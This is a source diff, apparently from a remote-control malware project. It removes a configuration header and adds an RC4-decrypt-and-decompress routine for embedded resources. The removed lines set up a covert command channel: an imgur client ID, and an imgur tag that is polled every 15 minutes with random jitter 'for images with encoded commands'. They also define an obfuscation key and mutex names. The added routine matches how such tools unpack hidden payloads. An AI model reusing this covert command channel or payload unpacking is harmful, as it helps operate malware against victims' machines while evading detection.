@@ -21,29 +21,27 @@
 // FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
 // DEALINGS IN THE SOFTWARE.
 //
-#pragma once
+#include <string.h>
+#include "miniz.h"
+#include "rc4.h"
+#include "resources.h"
 
-#ifdef __cplusplus
-inline unsigned operator "" _sec(unsigned long long int n)  { return static_cast<unsigned int>(n * 1000); }
-inline unsigned operator "" _min(unsigned long long int n)  { return static_cast<unsigned int>(n * 60 * 1000); }
-inline unsigned operator "" _hour(unsigned long long int n) { return static_cast<unsigned int>(n * 60 * 60 * 1000); }
-#endif
+bool resource_open(stl::vector<uint8_t>& output, const uint8_t* data, unsigned dlen, const uint8_t* key, unsigned klen)
+{
+    if (output.size() < dlen)
+        return false;
 
-// 64bit integer. A key used for obfuscating various data.
-#define vr_shared_key 0x982147b5bea3f6c2ull
+    stl::vector<uint8_t> decrypted{};
+    decrypted.resize(dlen);
+    memcpy(decrypted.data(), data, dlen);
 
-// String. Client id to be used for scanning imgur.
-#define vr_imgur_client_id "546c25a59c58ad7"
+    rc4_ctx rc4{};
+    rc4_init(&rc4, key, klen);
+    rc4_xor(&rc4, decrypted.data(), dlen);
 
-// String. imgur.com tag in which http module will look for images with encoded commands
-#define vr_imgur_tag "png"
+    mz_ulong size = (mz_ulong)output.size();
+    if (mz_uncompress(output.data(), &size, decrypted.data(), (mz_ulong)decrypted.size()) != MZ_OK)
+        return false;
 
-// Integer. Time between imgur tag queries
-#define vr_imgur_tag_query_time 15_min
-
-// Integer. Random time added to imgur tag query time
-#define vr_imgur_tag_query_time_jitter 1_min
-
-// Private variables, do not modify.
-#define vr_mutant_main_instance 0x1000
-#define gts_shared_memory_name  0x1001
+    return size == output.size();
+}
